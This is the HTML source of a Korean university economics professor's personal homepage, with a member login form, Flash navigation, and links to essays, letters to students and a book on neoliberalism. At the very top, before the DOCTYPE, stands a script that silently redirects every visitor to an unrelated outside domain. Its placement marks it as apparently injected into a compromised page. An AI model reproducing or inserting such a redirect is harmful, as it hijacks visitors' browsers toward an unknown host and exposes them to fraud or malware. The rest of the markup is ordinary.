	<script>
		location.href="http://jkl123.com";
	</script>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>서울대학교 경제학부의 이준구입니다.</title>
<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
<link href="styles.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.line {
	line-height: 150%;
}
-->
</style>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>
</head>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" class="TA">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td valign="top" background="img/bg1.jpg"><table width="900" border="0" cellspacing="0" cellpadding="0">
        <tr valign="top"> 
          <td width="150" bgcolor="2E4E8C">
            <link href="styles.css" rel="stylesheet" type="text/css">

<script language="JavaScript" type="text/JavaScript">
	<!--
	function MM_swapImgRestore() { //v3.0
		var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
	}
	
	function MM_preloadImages() { //v3.0
		var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
			var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
		if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
	}
	
	function MM_findObj(n, d) { //v4.01
		var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
		d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
		if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
		for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
		if(!x && d.getElementById) x=d.getElementById(n); return x;
	}
	
	function MM_swapImage() { //v3.0
		var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
		if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
	}
	//-->
</script>

<Script Language="JavaScript"> 

function log_send() 
{

if(document.login.id.value=="")
{
alert("아이디를 입력하세요.");
document.login.id.focus();
return;
}

if(document.login.pw.value=="")
{
alert("비밀번호를 입력하세요.");
document.login.pw.focus();
return;
}
document.login.submit();
}

</Script> 


<body onLoad="MM_preloadImages('img/m11_1.gif','img/m12_1.gif')">
<table width="150" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td>
			<a href="index.html"><img src="img/logo.jpg" width="150" height="140" border="0"></a>
		</td>
	</tr>
	<tr>
		<td height="28" align="center" valign="top" background="img/m10.gif">
			<a href="index.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image3','','img/m11_1.gif',1)"><img src="img/m11.gif" name="Image3" width="41" height="13" border="0"></a>
			<a href="sitemap.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image4','','img/m12_1.gif',1)"><img src="img/m12.gif" name="Image4" width="55" height="13" border="0"></a>
		</td>
	</tr>
	
		
	<form name="login" action="/lib/do_login.php" method="post">
	<input type="hidden" name="member_log" value="login">
	<input type="hidden" name="return_url" value="">
	
	<tr>
		<td height="130" align="center" valign="top" background="img/m10.gif">
			<table width="125" border="0" cellpadding="0" cellspacing="2" bgcolor="5d6373">
				<tr>
					<td height="110" align="center" valign="top" bgcolor="171f36">
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
							<tr>
								<td height="35" align="center">
									<img src="img/login_01.gif" width="102" height="16">
								</td>
							</tr>
							<tr>
								<td align="center">
									<table width="105"  border="0" cellspacing="0" cellpadding="0">
										<tr>
											<td height="21">
												<input name="id" type="text" size="9" style="font-size: 11px; padding: 2 0 0 2; height:16px; color:#33333; background-color:#F8F8F8; border:0px;" tabindex=1>
											</td>
											<td width="40" rowspan="2" align="right">
												<input type="image" border="0" onClick="log_send();return false;" src="img/login_02.gif" width="38" height="38" tabindex=3 align=absmiddle>
											</td>
										</tr>
										<tr>
											<td height="21">
												<input name="pw" type="password" style="font-size: 11px; padding: 2 0 0 2; height:16px; color:#33333; background-color:#F8F8F8; border:0px;" size="9" tabindex=2>
											</td>
										</tr>
									</table>
									<table width="105"  border="0" cellspacing="0" cellpadding="0">
										<tr>
											<td>
												<font color=#BABCC3 style='font-size:11'>자동 로그인</font> <input type='checkbox' name="auto_l" value="ok" style='border:0; background-color:#171F36'>
											</td>
										</tr>
									</table>
								</td>
							</tr>
							<tr>
								<td height="23" align="center" valign="bottom" class="text_mm">
									<a href="sub_mem1.htm"><span class="text_mm">회원가입</span></a> | <a href="sub_mem2.htm"><span class="text_mm">ID/PW찾기</span></a>
								</td>
							</tr>							
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>

	 </form>
	
	<tr>
		<td height="382" valign="top">
			<div id="Layer1" style="position:absolute; left:0; top:298; width:150px; height:382; z-index:1">
			<textarea id=txt2 style="display:none;" rows="0" cols="0"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="230" height="382">
			<param name="movie" value="flash/menu.swf">
			<param name="quality" value="high">
			<param name="wmode" value="transparent">
			<embed src="flash/menu.swf" width="230" height="382" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed></object></textarea>
			<script language="javascript" src=/activex.php?txtid=txt2></script>
			</div>
		</td>
	</tr>
</table>          </td>
          <td width="450" bgcolor="2E4E8C"><textarea id=txt1 style="display:none;" rows="0" cols="0"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="450" height="550">
              <param name="movie" value="flash/main.swf">
              <param name="quality" value="high">
              <param name="wmode" value="transparent">
              <embed src="flash/main.swf" width="450" height="550" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed></object>
</textarea>
<script language="javascript" src=/activex.php?txtid=txt1></script></td>
          <td width="300" align="center"><table width="260" border="0" cellspacing="0" cellpadding="0">
              <tr> 
                <td height="35">&nbsp;</td>
              </tr>
              <tr> 
                <td height="31" valign="top"><a href="sub3_2.htm"><img src="img/m1.gif" width="260" height="21" border="0"></a></td>
              </tr>
              <tr> 
                <td>
				
                <table width="260" border="0" cellspacing="0" cellpadding="0">


<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_2.htm?table=my2&st=view&page=1&id=38&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">제자들에게 보내는 편지 11</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  


<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_2.htm?table=my2&st=view&page=1&id=37&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">제자들에게 보내는 편지 10</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  



<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_1.htm?table=my1&st=view&page=1&id=175&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">침대에 누워 있는 종합부동산세를 다시 일으켜 세우자</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  


<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_1.htm?table=my1&st=view&page=1&id=174&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">아직도 부동산 투기 억제가 답이다</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  



<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_3.htm?table=my3&st=view&page=1&id=30&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">\"꽃보다 제자\"</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  


<tr> 
<td height="20"><img src="img/dot1.gif" width="18" height="6" align="absmiddle"><a href="sub3_3.htm?table=my3&st=view&page=1&id=29&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">스위스의 애제자로부터 날아온 메일</a><img src="img/dot3.gif" width="28" height="9" align="absmiddle"></td>
 </tr>
             
				  

</table>




    				
					
					
              </td>
              </tr>
              <tr> 
                <td height="28">&nbsp;</td>
              </tr>
              <tr> 
                <td height="36" valign="top"><a href="sub2_1.htm"><img src="img/m2.gif" width="260" height="21" border="0"></a></td>
              </tr>
              <tr> 
                <td>
			
				<table width="260" border="0" cellspacing="0" cellpadding="0">
                    <tr valign="top"> 
                      <td width="95">
						<table width="77" border="0" cellspacing="0" cellpadding="0">
  
                          <tr> 
                            <td><img src="img/m3.gif" width="77" height="6"></td>
                          </tr>
                          <tr> 
                            <td align="center" background="img/m5.gif"><table width="65" height="98" border="0" cellpadding="0" cellspacing="0">
                                <tr> 
                                  <td><a href="sub2_1.htm"><a href="sub2_1.htm?table=book2&st=view&page=1&id=14&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">
								  <img src="data/bbs/con_Sp0Cj5.jpg" width="65" height="98" border="0"></a></td>
                                </tr>
                              </table></td>
                          </tr>
                          <tr> 
                            <td><img src="img/m4.gif" width="77" height="6"></td>
                          </tr>
                        </table></td>

                      <td width="165"><table width="165" border="0" cellspacing="0" cellpadding="0">
                        <tr> 
                            <td height="20"><font color="0A6E91"><a href="sub2_1.htm?table=book2&st=view&page=1&id=14&limit=&keykind=&keyword=&bo_class=&fpage=&spage="><strong>[미국의 신자유주의 실험]</strong></a></font></td>
                          </tr>
                          <tr> 
                            <td height="1" background="img/dot2.gif"></td>
                          </tr>
                          <tr> 
                            <td height="5"></td>
                          </tr>
                          <tr> 
                            <td class="line"><a href="sub2_1.htm?table=book2&st=view&page=1&id=14&limit=&keykind=&keyword=&bo_class=&fpage=&spage=">미국에서 승자독식정치가 자리를 잡고 신자유주의정책의 실험이 시작되는 과정, 그리고 그 결과 역사상 최악의 분배상태를 향해 치닫는 광경을 보..</a></td>
                          </tr>
                        </table></td>
                    </tr>
                  </table>
				  
				</td>
              </tr>
              <tr> 
                <td height="38">&nbsp;</td>
              </tr>
              <tr> 
                <td><a href="sub1_1.htm"><img src="img/m7.gif" width="86" height="123" border="0"></a><a href="sub5_1.htm"><img src="img/m8.gif" width="89" height="123" border="0"></a><a href="http://econ.snu.ac.kr/m4/m4_1.htm" target="_blank"><img src="img/m9.gif" width="85" height="123" border="0"></a></td>
              </tr>
              <tr> 
                <td>&nbsp;</td>
              </tr>
            </table></td>
        </tr>
      </table></td>
  </tr>
  <tr> 
    <td height="22">&nbsp;</td>
  </tr>
  <tr> 
    <td bgcolor="F0F0F0"><img src="img/copy.gif" width="910" height="52"></td>
  </tr>
  <tr>
    <td height="22">&nbsp;</td>
  </tr>
</table>
</body>
</html>